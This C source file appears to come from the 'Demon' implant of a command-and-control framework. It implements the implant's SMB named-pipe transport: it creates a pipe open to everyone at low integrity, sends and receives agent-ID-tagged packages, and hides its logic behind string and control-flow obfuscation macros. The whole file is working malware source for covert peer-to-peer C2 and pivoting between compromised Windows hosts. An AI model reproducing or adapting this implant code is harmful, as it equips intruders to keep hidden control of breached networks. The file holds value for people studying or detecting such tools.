#include <Demon.h>

#include <core/TransportSmb.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_SMB

BOOL SmbSend( PBUFFER Send )
{
    VM_IF ( ! Instance->Config.Transport.Handle )
    {
        SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
        SECURITY_ATTRIBUTES SecurityAttr = { 0 };

        /* Setup attributes to allow "anyone" to connect to our pipe */
        SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );

        Instance->Config.Transport.Handle = Instance->Win32.CreateNamedPipeW( Instance->Config.Transport.Name,  // Named Pipe
                                                                            PIPE_ACCESS_DUPLEX,              // read/write access
                                                                            PIPE_TYPE_MESSAGE     |          // message type pipe
                                                                            PIPE_READMODE_MESSAGE |          // message-read mode
                                                                            PIPE_WAIT,                       // blocking mode
                                                                            PIPE_UNLIMITED_INSTANCES,        // max. instances
                                                                            PIPE_BUFFER_MAX,                 // output buffer size
                                                                            PIPE_BUFFER_MAX,                 // input buffer size
                                                                            0,                               // client time-out
                                                                            &SecurityAttr );                 // security attributes

        SmbSecurityAttrFree( &SmbSecAttr );

        VM_IF ( ! Instance->Config.Transport.Handle )
            return FALSE;

        VM_IF ( ! Instance->Win32.ConnectNamedPipe( Instance->Config.Transport.Handle, NULL ) )
        {
            SysNtClose( Instance->Config.Transport.Handle );
            return FALSE;
        }

        /* Send the message/package we want to send to the new client... */
        return PipeWrite( Instance->Config.Transport.Handle, Send );
    }

    VM_IF ( ! PipeWrite( Instance->Config.Transport.Handle, Send ) )
    {
        PRINTF( HIDE_STRING("WriteFile Failed:[%d]\n"), NtGetLastError() );

        /* Means that the client disconnected/the pipe is closing. */
        VM_IF ( NtGetLastError() == ERROR_NO_DATA )
        {
            VM_IF ( Instance->Config.Transport.Handle )
            {
                SysNtClose( Instance->Config.Transport.Handle );
                Instance->Config.Transport.Handle = NULL;
            }

            Instance->Session.Connected = FALSE;
            return FALSE;
        }
    }

    return TRUE;
}

BOOL SmbRecv( PBUFFER Resp )
{
    DWORD BytesSize   = 0;
    DWORD DemonId     = 0;
    DWORD PackageSize = 0;

    VM_IF ( Instance->Win32.PeekNamedPipe( Instance->Config.Transport.Handle, NULL, 0, NULL, &BytesSize, NULL ) )
    {
        VM_IF ( BytesSize > sizeof( UINT32 ) + sizeof( UINT32 ) )
        {
            VM_IF ( ! Instance->Win32.ReadFile( Instance->Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
            {
                PRINTF( HIDE_STRING("Failed to read the DemonId from pipe, error: %d\n"), NtGetLastError() )
                Resp->Buffer = NULL;
                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            VM_IF ( Instance->Session.AgentID != DemonId )
            {
                PRINTF( HIDE_STRING("The message doesn't have the correct DemonId: %x\n"), DemonId )
                Resp->Buffer = NULL;
                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            VM_IF ( ! Instance->Win32.ReadFile( Instance->Config.Transport.Handle, &PackageSize, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
            {
                PRINTF( HIDE_STRING("Failed to read the PackageSize from pipe, error: %d\n"), NtGetLastError() )
                Resp->Buffer = NULL;
                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            Resp->Buffer = Instance->Win32.LocalAlloc( LPTR, PackageSize );
            Resp->Length = PackageSize;

            VM_IF ( ! PipeRead( Instance->Config.Transport.Handle, Resp ) )
            {
                PRINTF( HIDE_STRING("PipeRead failed with to read 0x%x bytes from pipe\n"), Resp->Length )
                VM_IF ( Resp->Buffer )
                {
                    Instance->Win32.LocalFree( Resp->Buffer );
                    Resp->Buffer = NULL;
                }

                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }
            //PRINTF("successfully read 0x%x bytes from pipe\n", PackageSize)
        }
        VM_ELSE_IF ( BytesSize > 0 )
        {
            PRINTF( HIDE_STRING("Data in the pipe is too small: 0x%x\n"), BytesSize )
        }
        VM_ELSE
        {
            // nothing to read
        }
    }
    VM_ELSE
    {
        /* We disconnected */
        PRINTF( HIDE_STRING("PeekNamedPipe failed with %d\n"), NtGetLastError() )
        Instance->Session.Connected = FALSE;
        return FALSE;
    }

    return TRUE;
}

/* Took it from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/server_pivot_named_pipe.c#L286
 * But seems like MeterPreter doesn't free everything so let's do this too. */
VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )
{
    SID_IDENTIFIER_AUTHORITY SidIdAuth      = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SidLabel       = SECURITY_MANDATORY_LABEL_AUTHORITY;
    EXPLICIT_ACCESSW         ExplicitAccess = { 0 };
    DWORD                    Result         = 0;
    PACL                     DAcl           = NULL;
    /* zero them out. */
    MemSet( SmbSecAttr,   0, sizeof( SMB_PIPE_SEC_ATTR ) );
    MemSet( SecurityAttr, 0, sizeof( PSECURITY_ATTRIBUTES ) );

    VM_IF ( ! Instance->Win32.AllocateAndInitializeSid( &SidIdAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->Sid ) )
    {
        PRINTF( HIDE_STRING("AllocateAndInitializeSid failed: %u\n"), NtGetLastError() );
        return;
    }
    PRINTF( HIDE_STRING("SmbSecAttr->Sid: %p\n"), SmbSecAttr->Sid );

    ExplicitAccess.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
    ExplicitAccess.grfAccessMode        = SET_ACCESS;
    ExplicitAccess.grfInheritance       = NO_INHERITANCE;
    ExplicitAccess.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ExplicitAccess.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ExplicitAccess.Trustee.ptstrName    = SmbSecAttr->Sid;

    Result = Instance->Win32.SetEntriesInAclW( 1, &ExplicitAccess, NULL, &DAcl );
    VM_IF ( Result != ERROR_SUCCESS )
    {
        PRINTF( HIDE_STRING("SetEntriesInAclW failed: %u\n"), Result );
    }
    PRINTF( HIDE_STRING("DACL: %p\n"), DAcl );

    VM_IF ( ! Instance->Win32.AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->SidLow ) )
    {
        PRINTF( HIDE_STRING("AllocateAndInitializeSid failed: %u\n"), NtGetLastError() );
    }
    PRINTF( HIDE_STRING("sidLow: %p\n"), SmbSecAttr->SidLow );

    SmbSecAttr->SAcl = MmHeapAlloc( MAX_PATH );
    VM_IF ( ! Instance->Win32.InitializeAcl( SmbSecAttr->SAcl, MAX_PATH, ACL_REVISION_DS ) )
    {
        PRINTF( HIDE_STRING("InitializeAcl failed: %u\n"), NtGetLastError() );
    }

    VM_IF ( ! Instance->Win32.AddMandatoryAce( SmbSecAttr->SAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow ) )
    {
        PRINTF( HIDE_STRING("AddMandatoryAce failed: %u\n"), NtGetLastError() );
    }

    // now build the descriptor
    SmbSecAttr->SecDec = MmHeapAlloc( SECURITY_DESCRIPTOR_MIN_LENGTH );
    VM_IF ( ! Instance->Win32.InitializeSecurityDescriptor( SmbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION ) )
    {
        PRINTF( HIDE_STRING("InitializeSecurityDescriptor failed: %u\n"), NtGetLastError() );
    }

    VM_IF ( ! Instance->Win32.SetSecurityDescriptorDacl( SmbSecAttr->SecDec, TRUE, DAcl, FALSE ) )
    {
        PRINTF( HIDE_STRING("SetSecurityDescriptorDacl failed: %u\n"), NtGetLastError() );
    }

    VM_IF ( ! Instance->Win32.SetSecurityDescriptorSacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->SAcl, FALSE ) )
    {
        PRINTF( HIDE_STRING("SetSecurityDescriptorSacl failed: %u\n"), NtGetLastError() );
    }

    SecurityAttr->lpSecurityDescriptor = SmbSecAttr->SecDec;
    SecurityAttr->bInheritHandle       = FALSE;
    SecurityAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );
}

VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
{
    VM_IF ( SmbSecAttr->Sid )
    {
        Instance->Win32.FreeSid( SmbSecAttr->Sid );
        SmbSecAttr->Sid = NULL;
    }

    VM_IF ( SmbSecAttr->SidLow )
    {
        Instance->Win32.FreeSid( SmbSecAttr->SidLow );
        SmbSecAttr->SidLow = NULL;
    }

    VM_IF ( SmbSecAttr->SAcl )
    {
        MmHeapFree( SmbSecAttr->SAcl );
        SmbSecAttr->SAcl = NULL;
    }

    VM_IF ( SmbSecAttr->SecDec )
    {
        MmHeapFree( SmbSecAttr->SecDec );
        SmbSecAttr->SecDec = NULL;
    }
}

#endif